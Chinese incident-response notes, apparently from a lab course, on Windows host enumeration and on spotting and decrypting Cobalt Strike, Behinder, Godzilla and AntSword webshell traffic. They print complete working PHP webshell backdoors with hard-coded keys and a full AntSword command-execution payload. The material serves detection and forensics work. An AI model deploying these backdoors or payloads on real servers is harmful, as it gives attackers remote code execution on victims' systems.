<!-- 这是一张图片，ocr 内容为：PS C:\USERS\USER> NET LOCALGROUP A ROUP ADMINISTRATORS ALIAS NAME ADMINISTRATORS CTED ACCESS TO THE COMPUTER/DOMAIN ADMINISTRATORS HAVE COMPLETE AND UNRESTRICTED COMMENT MEMBERS ADMINISTRATOR PETER STRATEGOS USER THE COMMAND COMPLETED SUCCESSFULLY. -->


4. net share 查看共享文件

<!-- 这是一张图片，ocr 内容为：PS C:\USERS\USER> NET SHARE SHARE NAME RESOURCE REMARK C:1 C$ DEFAULT SHARE IPC$ REMOTE IPC C:\WINDOWS ADMIN$ REMOTE ADMIN INTERNAL DOCUMENTS C:\INTERNAL FILES INTERNAL ENJOY SMB SHARES C:\USERS\USER\PRIVATE THM{829738] C:\USERS USERS THE COMMAND COMPLETED SUCCESSFULLY. -->


## 个人信息
```plain
whoami
whoami /priv 		# 查看开启的权限
whoami /groups 	# windows 本地组 
```

## 网络信息
1. ipconfig 信息

```plain
ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::3dc5:78ef:1274:a740%5
   IPv4 Address. . . . . . . . . . . : 10.20.30.130
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.20.30.2
```

2. netstat

```plain
C:\>netstat -abno
Active Connections
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2016
 [sshd.exe]
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
  RpcSs
 [svchost.exe]
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
 Can not obtain ownership information
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       416
  TermService
 [svchost.exe]
[...]
  TCP    10.20.30.130:22        10.20.30.1:39956       ESTABLISHED     2016
 [sshd.exe]
  TCP    10.20.30.130:22        10.20.30.1:39964       ESTABLISHED     2016
 [sshd.exe]
[...]
```

3. arp

显示了 IP 到物理地址的转换表

# webshell应急响应
## <font style="color:rgb(51, 51, 51);">1.CodelStrike流量-beacon模式</font>
### <font style="color:rgb(119, 119, 119);">a.特征</font>
<font style="color:rgb(51, 51, 51);">https-beacon通信中，cs默认使用空证书建立加密通道，流量中可以看见这一过程。</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">同时在 https 协议的 Client Hello 和 Server Hello 阶段，都包含了 JA3S 值传输过程过程中会有 ja3，这个值在系统上是固定的，win10是一种的 但win11是另一种 他们取决于操作系统</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">http-beacon通信中，默认使用get方法向/dpixel、/__utm.gif、/pixel.gif等地址发起请求</font>

<font style="color:rgb(51, 51, 51);">同时get读文件时cookie是一串base64的值，这是cs流量的元数据（后面解密会用）</font>

<!-- 这是一张图片，ocr 内容为： -->


### <font style="color:rgb(119, 119, 119);">b.shell内容</font>
<font style="color:rgb(51, 51, 51);">POST /submit.php?id=xxxxx</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">其中post一串0000的data为cs发送流量的数据 （解密时需要转成base64）</font>

<!-- 这是一张图片，ocr 内容为： -->


### <font style="color:rgb(119, 119, 119);">c.密钥文件</font>
<font style="color:rgb(51, 51, 51);">.cobalstrike.beacon_keys 的java反序列化字节流 .ser文件</font>

### <font style="color:rgb(119, 119, 119);">d.解密cs流量</font>
[https://github.com/Slzdude/cs-scripts](https://github.com/Slzdude/cs-scripts)

<font style="color:rgb(51, 51, 51);">导入java反序列化字节流文件入 parse_beacon_keys.py 得到rsa公私钥，私钥为主</font>

<!-- 这是一张图片，ocr 内容为： -->


[https://github.com/WBGlIl/CS_Decrypt](https://github.com/WBGlIl/CS_Decrypt)

<font style="color:rgb(51, 51, 51);">将私钥和 cookie 值（cs元数据）导入 Beacon_metadata_RSA_Decrypt.py 解密出AES key 和 HMAC key</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">导入 AES key 和 HMAC key 和发送数据的base64格式入 Beacon_Task_return_AES_Decrypt.py 解密发送的数据</font>

<!-- 这是一张图片，ocr 内容为： -->


## <font style="color:rgb(51, 51, 51);">2.冰蝎流量</font>
### <font style="color:rgb(119, 119, 119);">a.特征</font>
<font style="color:rgb(51, 51, 51);">请求和返回值为 base64 的 aes 加密值</font>

### <font style="color:rgb(119, 119, 119);">b.shell内容</font>
<font style="color:rgb(51, 51, 51);">冰蝎2</font>

```plain
<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
  //这里如果接收到get请求的pass参数
{
  $key=substr(md5(uniqid(rand())),16);
  //生成16位的随机秘钥用md5加密
  $_SESSION['k']=$key;
  //将上方生成的KEY存储到SEESSION中
  print $key;
}
else
  //如果没接收到pass参数，利用存储的KEY进行解密
{
  $key=$_SESSION['k'];
  //接收执行的命令
  $post=file_get_contents("php://input");
  if(!extension_loaded('openssl'))
  {
    $t="base64_"."decode";
    $post=$t($post."");

    for($i=0;$i<strlen($post);$i++) {
      $post[$i] = $post[$i]^$key[$i+1&15]; 
    }
  }
  else
    //使用oppenssl进行AES128加密(这里要注意他用的AES128解密的时候也需要用这个)
  {
    $post=openssl_decrypt($post, "AES128", $key);
  }
  //将解密后的$post以'|'分割为数组。
  $arr=explode('|',$post);
  $func=$arr[0];
  $params=$arr[1];
  class C{public function __construct($p) {eval($p."");}}
  //创建C类，利用__construct中的eval来执行解密后的值
  @new C($params);
}
?>
```

<font style="color:rgb(51, 51, 51);">冰蝎3</font>

```plain
<?php
@error_reporting(0);
session_start();
$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
$_SESSION['k']=$key;
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
  $t="base64_"."decode";
  $post=$t($post."");

  for($i=0;$i<strlen($post);$i++) {
    $post[$i] = $post[$i]^$key[$i+1&15]; 
  }
}
else
{
  $post=openssl_decrypt($post, "AES128", $key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{public function __invoke($p) {eval($p."");}}
@call_user_func(new C(),$params);
?>
```

<font style="color:rgb(51, 51, 51);">冰蝎2与冰蝎3 除了key生成方式区别外并无不同，加密逻辑为 AES CBC 后 base64</font>

### <font style="color:rgb(119, 119, 119);">c.解密冰蝎流量（iv用00填充）</font>
<font style="color:rgb(51, 51, 51);">请求包和返回包（重点！iv是全0填充0000000000000000000000000000000）</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">解密的结果再进行一次base64解密即可</font>

<font style="color:rgb(51, 51, 51);">python解密脚本</font>

```plain
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def aes_decrypt_cbc(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    plaintext = unpad(plaintext, AES.block_size)
    return plaintext

ciphertext_base64 = b'uU7xO0V/KGySO6rdSlEw/dQXFklZWZn1EMhiAAoH7WPgcZi0gqTYodGuKeZEwtv2Gw1H/AgTwH2yV+Ix3A5QEhB3qHn5V1mOdSHC5dBkMmn6niKXQvCEsFi00fJXrxuXI9KhhR14BXCxYfRnA1KDjQ=='
ciphertext = base64.b64decode(ciphertext_base64)
key = b'7d7c23e87b47368b'
iv = b'\x00' * 16  # 16 bytes of zeros

plaintext = aes_decrypt_cbc(ciphertext, key, iv)
print(plaintext)
```

## <font style="color:rgb(51, 51, 51);">3.冰蝎流量（java）</font>
### <font style="color:rgb(119, 119, 119);">a.特征</font>
<font style="color:rgb(51, 51, 51);">shell为java编写，且有 AES 加密字段</font>

### <font style="color:rgb(119, 119, 119);">b.解密</font>
<font style="color:rgb(51, 51, 51);">AES ECB解出 class文件</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">使用jadx进行反编译</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">再将返回值进行解密</font>

<!-- 这是一张图片，ocr 内容为： -->


<font style="color:rgb(51, 51, 51);">将raw值进行AES解密</font>

<!-- 这是一张图片，ocr 内容为： -->


## <font style="color:rgb(51, 51, 51);">4.哥斯拉流量</font>
### <font style="color:rgb(119, 119, 119);">a.特征</font>
<font style="color:rgb(51, 51, 51);">命令执行的变量名/pass为webshell连接密码 </font>

<!-- 这是一张图片，ocr 内容为： -->


### <font style="color:rgb(119, 119, 119);">b.shell命令</font>
```plain
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='air123';
$payloadName='payload';
$key='d8ea7326e6ec5916';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

### <font style="color:rgb(119, 119, 119);">c.解密</font>
<font style="color:rgb(51, 51, 51);">base64解密后异或key，重要（其中key的第一位要移到最后一位）</font>

<!-- 这是一张图片，ocr 内容为： -->


## <font style="color:rgb(51, 51, 51);">5.哥斯拉流量（java）</font>
### <font style="color:rgb(119, 119, 119);">a.解密</font>
<font style="color:rgb(51, 51, 51);">得到16进制密文后 进行 AES ECB解密，在进行Gzip</font>

<!-- 这是一张图片，ocr 内容为： -->


## <font style="color:rgb(51, 51, 51);">6.蚁剑/菜刀流量</font>
### a.特征 & 密码 & 解密
<font style="color:rgb(51, 51, 51);">返回和发送内容可能为base64或者明文，如果base64去掉前面几位可以直接base64解码出来，则为蚁剑/菜刀流量</font>

<font style="color:rgb(51, 51, 51);">连接密码：第一位，比如 1=.......，则连接密码为 1</font>

### b.shell内容
```plain
1=@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.d53e47c56e78";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "2c"."3f5";echo @asenc($output);echo "20"."c49";}ob_start();try{$p=base64_decode(substr($_POST["ma569eedd00c3b"],2));$s=base64_decode(substr($_POST["ucc3f8650c92ac"],2));$envstr=@base64_decode(substr($_POST["e5d0dbe94954b3"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();&e5d0dbe94954b3=SR&ma569eedd00c3b=38L2Jpbi9zaA==&ucc3f8650c92ac=AkY2QgIi92YXIvd3d3L2h0bWwiO2lkO2VjaG8gZTEyNGJjO3B3ZDtlY2hvIDQzNTIz
```

